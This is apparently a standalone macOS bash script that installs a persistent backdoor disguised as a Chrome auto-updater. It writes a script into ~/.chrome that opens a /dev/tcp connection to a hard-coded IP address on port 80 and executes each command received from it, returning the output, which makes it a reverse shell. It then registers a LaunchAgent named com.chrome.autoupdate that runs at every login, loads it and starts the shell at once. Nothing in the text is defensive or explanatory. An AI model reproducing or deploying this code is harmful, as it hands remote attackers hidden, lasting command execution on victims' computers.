#!/usr/bin/env bash

logged=$(stat -f%Su /dev/console)

mkdir -p "$HOME/.chrome"

cat > "$HOME/.chrome/update1.sh" << 'EOF'
#!/usr/bin/env bash
item1="54.37.18.3"
item2="80"
exec 5<>/dev/tcp/$item1/$item2
cat <&5 | while read line; do $line 2>&5 >&5; done
EOF

chmod +x "$HOME/.chrome/update1.sh"

cat > "$HOME/.chrome/update2.sh" << 'EOF'
#!/usr/bin/env bash
nohup ~/.chrome/update1.sh > ~/.chrome/chrome.sh.log 2>&1 &
EOF

chmod +x "$HOME/.chrome/update2.sh"

cat > "$HOME/Library/LaunchAgents/com.chrome.autoupdate.plist" << EOF 
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.chrome.autoupdate</string>
    <key>ProgramArguments</key>
    <array>
        <string>/Users/$logged/.chrome/update2.sh</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <false/>
</dict>
</plist>
EOF

launchctl load "$HOME/Library/LaunchAgents/com.chrome.autoupdate.plist"

"$HOME/.chrome/update2.sh"
